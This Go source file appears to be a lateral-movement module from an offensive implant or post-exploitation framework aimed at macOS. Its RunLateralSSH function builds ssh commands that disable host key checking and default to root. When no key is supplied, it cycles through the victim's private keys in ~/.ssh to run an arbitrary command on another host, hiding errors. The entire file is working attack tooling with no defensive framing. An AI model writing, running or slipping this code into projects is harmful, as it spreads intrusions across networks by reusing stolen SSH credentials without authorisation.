package module

import (
	"fmt"
	"strings"
)

// RunLateralSSH performs SSH-based lateral movement (macOS has SSH built-in).
func RunLateralSSH(params map[string]interface{}) (string, error) {
	target, _ := params["target"].(string)
	user, _ := params["user"].(string)
	command, _ := params["command"].(string)
	keyPath, _ := params["keyPath"].(string)

	if target == "" || command == "" {
		return "", fmt.Errorf("target and command params required")
	}
	if user == "" {
		user = "root"
	}

	var cmds []string
	if keyPath != "" {
		cmds = append(cmds, fmt.Sprintf("ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -i %s %s@%s '%s' 2>&1", escapeSQ(keyPath), escapeSQ(user), escapeSQ(target), escapeSQ(command)))
	} else {
		cmds = append(cmds, fmt.Sprintf("for key in ~/.ssh/id_rsa ~/.ssh/id_ed25519 ~/.ssh/id_ecdsa; do [ -f \"$key\" ] && ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -i \"$key\" %s@%s '%s' 2>/dev/null && break; done", escapeSQ(user), escapeSQ(target), escapeSQ(command)))
	}

	return run(strings.Join(cmds, "\n"))
}

// RunLateralAll runs all lateral movement probes.
func RunLateralAll(params map[string]interface{}) (string, error) {
	return RunLateralSSH(params)
}
